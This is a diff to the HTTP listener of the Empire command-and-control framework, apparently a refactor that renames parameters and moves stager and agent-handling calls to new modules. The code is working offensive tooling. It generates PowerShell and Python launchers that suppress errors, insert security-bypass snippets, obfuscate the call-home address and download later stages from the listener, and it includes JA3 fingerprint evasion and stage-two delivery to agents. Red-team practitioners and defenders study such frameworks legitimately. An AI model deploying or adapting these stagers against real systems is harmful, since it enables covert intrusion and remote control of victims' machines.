@@ -143,11 +143,6 @@ class Listener:
                 "Required": False,
                 "Value": "default",
             },
-            "SlackURL": {
-                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
-                "Required": False,
-                "Value": "",
-            },
             "JA3_Evasion": {
                 "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
                 "Required": True,
@@ -214,13 +209,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] | None = None,
     ):
         """
@@ -229,7 +224,7 @@ class Listener:
         bypasses = [] if bypasses is None else bypasses
         if not language:
             log.error(
-                f"{listenerName}: listeners/http generate_launcher(): no language specified!"
+                f"{listener_name}: listeners/http generate_launcher(): no language specified!"
             )
             return None
 
@@ -255,20 +250,20 @@ class Listener:
             # PowerShell
             stager = '$ErrorActionPreference = "SilentlyContinue";'
 
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
             for bypass in bypasses:
                 stager += bypass
 
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
 
             stager += "$wc=New-Object System.Net.WebClient;"
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
-            stager += f"$u='{ userAgent }';"
+                user_agent = profile.split("|")[1]
+            stager += f"$u='{ user_agent }';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
@@ -277,7 +272,7 @@ class Listener:
                 f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
             )
 
-            if userAgent.lower() != "none":
+            if user_agent.lower() != "none":
                 stager += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
@@ -287,14 +282,14 @@ class Listener:
                         # TODO: implement form for other proxy
                         stager += f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');$wc.Proxy = $proxy;"
 
-                    if proxyCreds.lower() != "none":
-                        if proxyCreds.lower() == "default":
+                    if proxy_creds.lower() != "none":
+                        if proxy_creds.lower() == "default":
                             stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                         else:
                             # TODO: implement form for other proxy credentials
-                            username = proxyCreds.split(":")[0]
-                            password = proxyCreds.split(":")[1]
+                            username = proxy_creds.split(":")[0]
+                            password = proxy_creds.split(":")[1]
                             if len(username.split("\\")) > 1:
                                 usr = username.split("\\")[1]
                                 domain = username.split("\\")[0]
@@ -389,20 +384,20 @@ class Listener:
                 )
 
             try:
-                if safeChecks.lower() == "true":
+                if safe_checks.lower() == "true":
                     launcherBase += listener_util.python_safe_checks()
             except Exception as e:
-                p = f"{listenerName}: Error setting LittleSnitch in stager: {e!s}"
+                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
                 log.error(p)
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
+                user_agent = profile.split("|")[1]
 
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{ userAgent }';server='{ host }';t='{ stage0 }';
+                UA='{ user_agent }';server='{ host }';t='{ stage0 }';
                 req=urllib.request.Request(server+t);
                 """
             )
@@ -435,15 +430,15 @@ class Listener:
                     proto = proxy.split(":")[0]
                     launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
 
-                if proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
 
                         # add the RC4 packet to a cookie
                         launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
                     else:
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += dedent(
                             f"""
                             proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
@@ -502,16 +497,12 @@ class Listener:
                 .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
             )
 
-            compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
-            if compiler.status != "ON":
-                self.instance_log.error(
-                    f"{listenerName} csharpserver plugin not running"
-                )
-                return None
-            return compiler.do_send_stager(stager_yaml, "Sharpire", confuse=obfuscate)
+            return self.mainMenu.dotnet_compiler.compile_stager(
+                stager_yaml, "Sharpire", confuse=obfuscate
+            )
 
         self.instance_log.error(
-            f"{listenerName}: listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
+            f"{listener_name}: listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
         )
         return None
 
@@ -831,27 +822,27 @@ class Listener:
                 obfuscation_command = obfuscation_config.command
 
             if stager == "powershell":
-                return self.mainMenu.stagers.generate_launcher(
-                    listenerName=hop or listenerName,
+                return self.mainMenu.stagergenv2.generate_launcher(
+                    listener_name=hop or listenerName,
                     language="powershell",
                     encode=False,
                     obfuscate=obfuscation,
                     obfuscation_command=obfuscation_command,
-                    userAgent=userAgent,
+                    user_agent=userAgent,
                     proxy=proxy,
-                    proxyCreds=proxyCreds,
+                    proxy_creds=proxyCreds,
                 )
 
             if stager == "python":
-                return self.mainMenu.stagers.generate_launcher(
-                    listenerName=hop or listenerName,
+                return self.mainMenu.stagergenv2.generate_launcher(
+                    listener_name=hop or listenerName,
                     language="python",
                     encode=False,
                     obfuscate=obfuscation,
                     obfuscation_command=obfuscation_command,
-                    userAgent=userAgent,
+                    user_agent=userAgent,
                     proxy=proxy,
-                    proxyCreds=proxyCreds,
+                    proxy_creds=proxyCreds,
                 )
 
             if stager == "ironpython":
@@ -861,35 +852,35 @@ class Listener:
                     options["Listener"]["Value"] = hop
                     options["Language"] = {}
                     options["Language"]["Value"] = stager
-                    launcher = self.mainMenu.stagers.generate_stageless(options)
+                    launcher = self.mainMenu.stagergenv2.generate_stageless(options)
                 else:
-                    launcher = self.mainMenu.stagers.generate_launcher(
-                        listenerName=hop or listenerName,
+                    launcher = self.mainMenu.stagergenv2.generate_launcher(
+                        listener_name=hop or listenerName,
                         language="python",
                         encode=False,
                         obfuscate=obfuscation,
-                        userAgent=userAgent,
+                        user_agent=userAgent,
                         proxy=proxy,
-                        proxyCreds=proxyCreds,
+                        proxy_creds=proxyCreds,
                     )
 
-                directory = self.mainMenu.stagers.generate_python_exe(
+                directory = self.mainMenu.stagergenv2.generate_python_exe(
                     launcher, dot_net_version="net40", obfuscate=obfuscation
                 )
                 with open(directory, "rb") as f:
                     return f.read()
 
             elif stager == "csharp":
-                filename = self.mainMenu.stagers.generate_launcher(
-                    listenerName=hop or listenerName,
+                filename = self.mainMenu.stagergenv2.generate_launcher(
+                    listener_name=hop or listenerName,
                     language="csharp",
                     encode=False,
                     obfuscate=obfuscation,
-                    userAgent=userAgent,
+                    user_agent=userAgent,
                     proxy=proxy,
-                    proxyCreds=proxyCreds,
+                    proxy_creds=proxyCreds,
                 )
-                directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/net35/{filename}.exe"
+                directory = f"{self.mainMenu.installPath}/Empire-Compiler/EmpireCompiler/Data/Tasks/CSharp/Compiled/net35/{filename}.exe"
                 with open(directory, "rb") as f:
                     return f.read()
             else:
@@ -900,7 +891,7 @@ class Listener:
             """
             Before every request, check if the IP address is allowed.
             """
-            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
+            if not self.mainMenu.agentcommsv2.is_ip_allowed(request.remote_addr):
                 listenerName = self.options["Name"]["Value"]
                 message = f"{listenerName}: {request.remote_addr} on the blacklist/not on the whitelist requested resource"
                 self.instance_log.info(message)
@@ -996,7 +987,7 @@ class Listener:
                 return make_response(self.default_response(), 404)
 
             # parse the routing packet and process the results
-            dataResults = self.mainMenu.agents.handle_agent_data(
+            dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                 stagingKey, routingPacket, listenerOptions, clientIP
             )
 
@@ -1089,7 +1080,7 @@ class Listener:
 
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
-            dataResults = self.mainMenu.agents.handle_agent_data(
+            dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                 stagingKey, requestData, listenerOptions, clientIP
             )
             if not dataResults or len(dataResults) <= 0:
@@ -1107,7 +1098,9 @@ class Listener:
                     if ":" in clientIP:
                         clientIP = "[" + str(clientIP) + "]"
                     sessionID = results.split(b" ")[1].strip().decode("UTF-8")
-                    sessionKey = self.mainMenu.agents.agents[sessionID]["sessionKey"]
+                    sessionKey = self.mainMenu.agentcommsv2.agents[sessionID][
+                        "sessionKey"
+                    ]
 
                     listenerName = self.options["Name"]["Value"]
                     message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
